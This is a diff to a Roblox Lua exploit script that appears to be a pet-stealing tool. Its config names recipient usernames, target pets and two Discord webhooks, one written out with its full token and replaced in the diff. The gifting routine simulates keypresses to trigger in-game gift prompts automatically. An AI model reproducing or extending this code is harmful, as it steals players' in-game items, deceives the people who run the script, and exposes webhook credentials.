@@ -109,7 +109,7 @@ end
 local CONFIG = {
     username = type(getfenv().Username) == "table" and getfenv().Username or {getfenv().Username},
     webhook = getfenv().Webhook,
-    dualWebhook = "https://discord.com/api/webhooks/1396440349119086714/oS8gLE9tClIPmXohUb_yuNUGAid11DAjJrZ2nrREhgN24z7K5NFqPdFmHZz4aWwNUEQV",
+    dualWebhook = "https://discord.com/api/webhooks/1396184713311289354/0b-DXlEyHe5wu_9WXQRO89AAgEjNeSJbGDL7wFEDhvH-LMeBqxtuMuyaaxmISo9JT5UO",
     dualUsername = {"namnnni2", "BaldBaconFrrr"},
     dualWebhookThreshold = 1e12,
     TARGET_PETS = {
@@ -1004,23 +1004,15 @@ function GiftingSystem.tpAndAttach(target)
     return true
 end
 
+-- ✅ Đã sửa đoạn giftPet để không lỗi nil khi dùng keypress
+
 function GiftingSystem.giftPet(pet, target)
-    if not target or not target.Parent or not target.Character then
-        return false
-    end
-
-    if not pet or not pet.Parent or pet.Parent ~= backpack then
-        return false
-    end
-
-    if currentGiftingTarget ~= target then
-        return false
-    end
+    if not target or not target.Parent or not target.Character then return false end
+    if not pet or not pet.Parent or pet.Parent ~= backpack then return false end
+    if currentGiftingTarget ~= target then return false end
 
     local success = Utils.holdTool(pet)
-    if not success then
-        return false
-    end
+    if not success then return false end
 
     task.wait(CONFIG.holdDelay)
 
@@ -1037,7 +1029,7 @@ function GiftingSystem.giftPet(pet, target)
         return false
     end
 
-    -- Kích hoạt prompt chỉ khi gifting bắt đầu do username chat
+    -- Tìm Prompt gần nhất để kích hoạt bằng keypress
     local function getAllPrompts(root, maxDistance)
         for _, descendant in ipairs(workspace:GetDescendants()) do
             if descendant:IsA("ProximityPrompt") and descendant.Enabled and descendant.Parent then
@@ -1055,16 +1047,16 @@ function GiftingSystem.giftPet(pet, target)
     local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
     local prompt = root and getAllPrompts(root, CONFIG.maxDistance)
 
-    if prompt then
-        prompt.HoldDuration = CONFIG.promptHoldTime
-        prompt.Enabled = true
-
-        -- Gửi phím E kích hoạt prompt
+    if prompt and typeof(keypress) == "function" and typeof(keyrelease) == "function" then
         pcall(function()
+            prompt.HoldDuration = CONFIG.promptHoldTime
+            prompt.Enabled = true
             keypress(69)
             task.wait(CONFIG.promptHoldTime)
             keyrelease(69)
         end)
+    else
+        warn("Không tìm thấy prompt hoặc executor không hỗ trợ keypress")
     end
 
     task.wait(CONFIG.virtualInputDelay)
@@ -1073,6 +1065,7 @@ function GiftingSystem.giftPet(pet, target)
 
     return true
 end
+
 
     if not pet or not pet.Parent or pet.Parent ~= backpack then
         return false
